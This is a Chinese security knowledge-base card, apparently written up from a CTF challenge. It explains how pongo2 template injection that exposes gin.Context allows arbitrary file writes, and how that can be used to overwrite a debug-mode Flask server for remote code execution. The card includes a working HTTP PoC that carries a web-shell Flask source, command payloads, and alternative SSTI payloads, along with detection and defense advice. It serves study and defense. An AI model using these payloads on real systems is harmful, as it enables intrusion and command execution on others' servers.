---
id: web-golang-pongo2-gin-context-saveuploadedfile-debug-reload-rce
title: Go pongo2 SSTI 操控 gin.Context：FormFile+SaveUploadedFile 任意文件写，覆盖 Flask 源码借 debug 热重载 RCE
type: scenario
domain: web
path: web/golang
technique: pongo2-ssti-gin-context-arbitrary-file-write-debug-reload
tags:
- go
- golang
- pongo2
- ssti
- gin
- file-write
- flask
- debug
- rce
- template-injection
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V649
  verified_at: '2026-11-13T04:05:08+08:00'
  notes: 已对照原文与图26-34核对：pongo2.FromString 拼接+Context{"c":c}、FormFile/SaveUploadedFile gadget、/app/server.py 覆盖与 Flask debug 热重载路径均一致；已将 flag 文件名修正为图34所示的 th1s_1s_f13g。未验证点：PoC 未实际执行；图26 Index 源码中 cookie 名写作 admin 与正文 session-name 不一致（最终利用 cookie 名以图27/28/33 的 session-name 为准）。
url: /docs/web/golang/web-golang-pongo2-gin-context-saveuploadedfile-debug-reload-rce/
draft: false
kb_aliases:
- pongo2 SSTI
- gin.Context 模板注入
- SaveUploadedFile 任意文件写
- FormFile 模板调用
- Go SSTI 写文件
- Flask debug 热重载覆盖源码
- html.EscapeString 绕过
---

## 一句话结论

Go 应用把用户输入拼进 pongo2 模板、并把 `*gin.Context` 作为渲染数据时，模板里可直接调用 `c.FormFile`/`c.SaveUploadedFile` 把 multipart 上传内容写到任意路径；本文用它覆盖同机 Flask 服务的 `server.py`，Flask debug 模式热重载后加载攻击者代码，访问新增路由即可执行命令。

## 原理

- **pongo2 SSTI**：`pongo2.FromString("Hello " + html.EscapeString(name) + "!")` 把用户输入当模板源码解析，`tpl.Execute(pongo2.Context{"c": c})` 又把 `*gin.Context` 暴露为模板变量 `c`。pongo2 支持 `{{ }}`/`{% %}` 并可调用导出方法，因此 `c` 的所有方法都成为模板可调用的 gadget。
- **html.EscapeString 的限制与绕过**：模板拼接前做了 HTML 转义，`"`/`'` 变成实体，无法在模板里直接写字符串字面量参数；但 gin.Context 的方法可以返回运行时字符串（`c.Request.UserAgent()`、`c.ClientIP()`、`c.Request.Referer()`、`c.Request.Host()`、`c.Query(...)`），用这些"返回字符串的无参/单参方法"充当模板参数即可绕过转义限制。
- **任意文件写 gadget**：
  - `func (c *Context) FormFile(name string) (*multipart.FileHeader, error)`：按表单字段名取上传文件。
  - `func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error`：把该文件保存到 `dst`。
  - 组合 `{{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()), c.Request.UserAgent())}}`：把 User-Agent 同时当作表单字段名和目标路径，请求以 `multipart/form-data` 携带文件时即可写到任意路径。
- **为什么要覆盖 Flask 源码**：同机 `127.0.0.1:5000` 跑着 Flask 服务，`/flask` 路由会把请求参数拼进 `http://127.0.0.1:5000/<name>` 形成 SSRF/代理；Flask 以 `debug=True` 运行，Werkzeug reloader 检测到源文件变化会重启并加载新代码。攻击者把 `server.py` 覆盖为带 `/shell` 命令执行路由的版本后，访问 `/flask?name=/shell?cmd=...` 就会由 Flask 执行命令。
- 两处细节：`FormFile` 的 `name` 参数必须与 multipart 表单字段名一致（本例用 User-Agent 的值 `/app/server.py`，表单 `name="/app/server.py"`）；`SaveUploadedFile` 的 `dst` 也用同一值，从而覆盖 `/app/server.py`。

## 触发条件

- Go 应用使用 pongo2（或类似允许方法调用的模板）并把用户输入拼进模板源码；渲染数据包含 `*gin.Context` 或带文件操作方法的对象。
- 模板拼接前只做 HTML 转义（未过滤模板语法/未改用数据绑定），攻击者可用方法返回值作为参数。
- 目标进程对目标路径（如 Flask 源码目录）有写权限；同机存在 Flask/其他服务且 debug 模式开启（热重载）。
- `/admin` 等模板路由需要会话：本链前置为伪造 session（见关联卡）或已有权限。

## 利用步骤

1. 审计代码：确认 pongo2 拼接用户输入、`Execute(pongo2.Context{"c": c})` 暴露 gin.Context；确认 `/flask` 路由把参数拼进本地 Flask 地址（SSRF）且 Flask debug=True。
2. 获取 admin 会话（本例通过空 SESSION_KEY 伪造，见关联卡），进入模板路由。
3. 用无害 payload 探测方法可用性：`{{c.ClientIP()}}`、`{{c.Request.UserAgent()}}`、`{{c.HandlerName()}}`；`{%include c.Request.Referer()%}` 可尝试文件读。
4. 构造 multipart 请求：`Content-Type: multipart/form-data`，表单字段名设为 User-Agent 的值（如 `/app/server.py`），文件内容为恶意 Flask 源码；URL 中 `name={{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}}`。
5. 发送后确认 200；Flask reloader 检测到源码变化重启，访问 `/flask?name=/shell?cmd=ls$IFS/` 验证命令执行。
6. 用命令读取 flag/横向；恢复源码（如需要）或利用已有 shell 继续。

## PoC

```http
GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}} HTTP/1.1
Host: <target>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrxtSm5i2S6anueQi
User-Agent: /app/server.py

------WebKitFormBoundaryrxtSm5i2S6anueQi
Content-Disposition: form-data; name="/app/server.py"; filename="server.py"
Content-Type: text/plain

from flask import Flask, request
import os
app = Flask(__name__)
@app.route('/shell')
def shell():
    cmd = request.args.get('cmd')
    if cmd:
        return os.popen(cmd).read()
    return 'shell'
if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
------WebKitFormBoundaryrxtSm5i2S6anueQi--
```

```text
# reload 后经 /flask 代理访问新路由
GET /flask?name=/shell?cmd=ls$IFS/ HTTP/1.1
# cmd=cat$IFS/th1s_1s_f13g
```

```text
# 其他可用写法（参数来源换成 Host/Referer/ClientIP）
{{c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())}}
{%set form=c.Query(c.HandlerName|first)%}{%set path=c.Query(c.HandlerName|last)%}{%set file=c.FormFile(form)%}{{c.SaveUploadedFile(file,path)}}&m=file&n=/app/server.py
```

## 变体与关联

- 变体：文件读 gadget 用 `{%include c.Request.Referer()%}`、`{%include c.Request.Host()%}`、`{%include c.Query(c.ClientIP())%}` 把任意字符串（如源码路径）传给 include。
- 变体：目标不是 Flask 时，任意文件写可覆盖 Go 服务自身源码（air/realize 热重载开发模式）、crontab、模板文件、配置文件等，按部署形态选择。
- 变体：Go text/template/echo.Context 的文件系统读取 gadget 见关联卡；同机制不同框架/终点。
- 关联：[[web-golang-go-template-echo-context-filesystem-read]]（echo.Context 文件系统读）；[[web-golang-gopherblog-sqli-jwt-template-method-rce]]（text/template 方法调用 RCE）；[[web-golang-gorilla-sessions-empty-key-session-forgery]]（本链前置的 admin 会话伪造）。

## 检测与防御

- 检测：请求参数中出现 pongo2 语法（`{{`、`{%`）且调用 `c.` 方法链；multipart 请求的字段名/User-Agent 与模板表达式相同；对同一路由携带 multipart 与模板语法的组合请求。
- 检测：应用进程写入源码目录、Flask debug 错误页/traceback 暴露（`/app/server.py`）、reloader 频繁重启；随后新增路由被访问。
- 检测：Go 服务进程打开/写入非预期路径（源码、crontab、模板目录）；同机 Flask 进程重启与异常子进程。
- 防御：模板使用数据绑定（`{{ .Name }}`）而不是拼接用户输入；禁止把 `*gin.Context` 等能力对象传给模板；白名单过滤模板语法；Flask 关闭 debug、只监听内网且不代理用户可控路径；源码目录只读、运行账户最小权限。

## 备注

原文为 2023 国赛初赛 go_session 题复现：pongo2 模板拼用户输入、Execute 暴露 gin.Context；`/flask` 路由 SSRF 到本地 5000 端口 Flask（debug=True）；用 `{{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}}` 覆盖 `/app/server.py`，Flask 热重载后经 `/flask?name=/shell?cmd=...` 执行命令（图 26-34）。前置的 session 伪造见关联卡。原文未标注组件版本，affected_versions 省略。PoC 未执行。
